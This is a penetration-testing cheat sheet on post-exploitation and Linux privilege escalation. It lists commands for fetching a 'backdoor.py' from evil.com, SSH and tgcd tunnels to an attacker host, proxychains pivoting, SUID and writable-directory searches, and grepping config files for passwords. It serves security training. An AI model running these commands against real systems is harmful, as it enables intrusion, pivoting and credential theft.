# Post-Exploitation & Privilege Escalation

This is the phase I like to refer to as second pass enumeration or enumeration from the inside. Now that we've gained a foothold into the network it is crucial to run all of our enumeration from the ground up as an inside actor.

##### Resources

[https://moodle2.units.it/pluginfile.php/115306/mod\_resource/content/1/The%20Linux%20Programming%20Interface-Michael%20Kerrisk.pdf](https://moodle2.units.it/pluginfile.php/115306/mod_resource/content/1/The Linux Programming Interface-Michael Kerrisk.pdf)

##### Listing Packages

```
Kali> dpkg -l
Kali> rpm -qa
```

##### Uploading Files

```
Kali> wget http://evil.com/backdoor.py
Kali> curl http://evil.com/backdoor.py
Kali> scp ~/backdoor.py user@$TARGET:tmp/backdoor.py
```

##### Port Redirection

> ###### rinetd

```
rinetd

vi /etc/rinetd.conf
# bind        # port        # connect        # port
a.b.c.d     53             e.f.g.h         80
```

##### SSH Tunneling

> ###### SSH

```
# Local Tunnel
Kali> ssh $ATTACKER -L 3000:$TARGET:2222

# Remote Tunnel
Kali> ssh $TARGET -R 2222:localhost:3000

# Dynamic Tunnel to $TARGET
Kali> ssh -D 127.0.0.1:3000 -N username@$TARGET
```

> ###### tgcd

```
Kali> tgcd -L -p 9999 -q 40000
Kali> tgcd -C -s IP:9999 -c ATTACKER:40000
Kali> iptables -t nat -A OUTPUT -d IP -j DNAT --to-destination 127.0.0.1
```

##### Proxychains

```
# create reverse ssh tunnel on our target
Kali> ssh -f -N -R 2222:127.0.0.1:22 root@$ATTACKER

# create on our attacking machine
Kali> ssh -f -N -D 127.0.0.1:8080 -p 2222

# Good to go
Kali> proxychains nmap -sV $TARGET
```

##### HTTP Tunneling

```
Kali> nc -vvn $TARGET 8888
CONNECT $TARGET2:80 HTTP/1.0
```

##### Insecure Sudo

```
Kali> sudo -l
```

##### Finding gems on the file system

```
# Find commands for SUID or SGID
Kali> find / -perm -g=s -type f 2>/dev/null
Kali> find / -perm -u=s -type f 2>/dev/null

# Find commands for writable/executable directories
Kali> find / -writable -type d 2>/dev/null
Kali> find / -perm -o w -type d 2>/dev/null
Kali> find / -perm -o x -type d 2>/dev/null

# Sometimes a quick bit of information can be helpful
# Especially if you get access denied when you try to run a command
# Such as iptables -L
Kali> locate iptables

# Locate useful files like gcc, wget, etc
Kali> locate gcc

# Take advantage of wildcard searching
# This is only a base example of what you can do
# I use this technique often to find random things hidden deep in the file system
Kali> ls /*/*/*/*.conf

# Be creative
Kali> cat /etc/cron.*/* | grep SEARCHSTRING

# Mix it up
Kali> find / -type f -name '*.conf' | xargs grep -rnw -3 "Password" 2>/dev/null
```

##### Unmounted drives

```
Kali> cat /etc/fstab
Kali> mount
```

##### Exim

```
Kali> exim -bV -v | grep -i Perl
```

##### Wildcard Manipulation



